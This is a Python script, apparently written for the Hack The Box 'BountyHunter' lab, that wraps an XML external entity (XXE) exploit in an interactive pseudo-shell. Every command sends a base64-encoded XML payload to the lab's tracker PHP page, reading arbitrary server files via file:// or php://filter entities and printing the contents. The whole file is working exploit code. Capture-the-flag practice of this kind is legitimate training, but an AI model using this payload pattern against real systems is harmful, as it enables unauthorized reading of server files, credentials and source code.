#!/usr/bin/python3

# Example: XXE LFI shell - HTB BountyHunter
# Extremly useful for pseudoshells, e.g. for CTFs, where you get an `LFI` with limited command injection 
# or listing output. `Cmd` allows you to build an interactive shell with custom commands and so much 
# more "feeling at home" than editing Burp requests - in those scenarios it becomes a decisive tool.

import requests
import base64
from urllib.parse import urlencode, quote_plus
import cmd
import re

class shell(cmd.Cmd):
    def default(self, arg):
        xml =  '<?xml  version="1.0" encoding="ISO-8859-1"?>'
        xml += '<!DOCTYPE replace [<!ENTITY CWE SYSTEM "file://{}"> ]>'.format(arg)
        xml += '<bugreport>'
        xml += '<cwe>&CWE;</cwe>'
        xml += '</bugreport>'

        headers = {

        }

        data = {
            "data": base64.b64encode(bytes(xml, 'UTF8'))
        }

        url = "http://bountyhunter.htb/tracker_diRbPr00f314.php"

        res = requests.post(url, data=data)

        if res.text:
            print(re.sub(r'</td>.*\n.*</tr>.*\n.*<tr>', '', res.text.split('<td>')[4], re.MULTILINE))

    def do_file(self, arg):
        xml =  '<?xml  version="1.0" encoding="ISO-8859-1"?>'
        xml += '<!DOCTYPE replace [<!ENTITY CWE SYSTEM "php://filter/read=convert.base64-encode/resource={}"> ]>'.format(arg)
        xml += '<bugreport>'
        xml += '<cwe>&CWE;</cwe>'
        xml += '</bugreport>'

        headers = {

        }

        data = {
            "data": base64.b64encode(bytes(xml, 'UTF8'))
        }

        url = "http://bountyhunter.htb/tracker_diRbPr00f314.php"

        res = requests.post(url, data=data)
        print(base64.b64decode(re.sub(r'</td>.*\n.*</tr>.*\n.*<tr>', '', res.text.split('<td>')[4], re.MULTILINE)).decode('UTF8'))

shell().cmdloop()
